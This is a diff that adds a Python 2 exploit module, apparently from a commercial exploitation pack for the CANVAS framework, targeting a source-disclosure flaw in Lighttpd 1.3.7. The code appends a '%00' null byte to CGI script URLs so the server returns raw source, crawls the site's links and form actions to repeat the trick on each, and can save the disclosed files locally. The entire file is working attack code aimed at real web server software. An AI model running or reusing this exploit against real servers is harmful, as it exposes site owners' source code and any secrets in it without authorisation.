@@ -1,0 +1,133 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, time, os
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Lighttpd Remote CGI Script Disclosure"
+VERSION = "0.1"
+DESCRIPTION = "Lighttpd Remote CGI Script Disclosure Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "version 1.3.7"
+DOCUMENTATION["Date public"] = "2005/02/15"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/12567"
+
+class URLLister(SGMLParser):
+	def reset(self):
+		SGMLParser.reset(self)
+		self.urls = []
+
+	def start_a(self, attrs):
+		href = [v for k, v in attrs if k=='href']
+		if href:
+			self.urls.extend(href)
+
+	def start_form(self, attrs):
+		act = [v for k, v in attrs if k=='action']
+		if act:
+			self.urls.extend(act)
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.port = 80 
+		self.file = "index.php"
+		self.savelog = ""
+		self.name=NAME
+		self.ext = "%00"
+		return
+	
+	def display_file(self, u):
+		h = urlopen(u).read()
+
+		if len(self.savelog) > 0:
+			if u.find("/") >= 0:
+				u = u.split("/")
+				u = u[len(u)-1]
+				u = u.split("%")[0]
+
+			self.log("Saving %s" % u)
+			f = open("%s/%s" % (self.savelog, u), "w")
+			f.write(h)
+			f.close()
+		else:
+			self.log("[#] %s" % u)
+			self.log(h)
+			self.log("\n")
+
+
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.file = self.argsDict.get("file",self.file)
+		self.savelog = self.argsDict.get("savelog",self.savelog)
+
+		if len(self.savelog) > 0:
+			if os.path.exists(self.savelog) == True:
+				self.log("%s exists" % self.savelog)
+				self.log("\n")
+			else:
+				os.mkdir(self.savelog)
+
+		if self.file.find(".html") < 0:
+			self.display_file("http://%s:%d/%s%s" % (self.host, self.port, self.file, self.ext))
+
+		try:
+			h = urlopen("http://%s:%d/%s" % (self.host, self.port, self.file))
+		except:
+			self.log("Don't find another url")
+
+		parser = URLLister()
+		parser.feed(h.read())
+		parser.close()
+		h.close()
+
+		self.log("[#] URLs listing")
+		if len(parser.urls) == 0:
+			self.log("No other urls")
+		for url in parser.urls:
+			self.log("%s" % url)
+		self.log("\n")
+
+		for url in parser.urls:
+			if url.find(".html") >= 0:
+				continue
+			if url.find("http://") >= 0:
+				self.display_file("%s%s" % (url, self.ext))
+			else:
+				self.display_file("http://%s:%d/%s%s" % (self.host, self.port, url, self.ext))
+
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+
+		return 0
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O file:<path> -O savelog:<path>"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s v %s" % (NAME,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
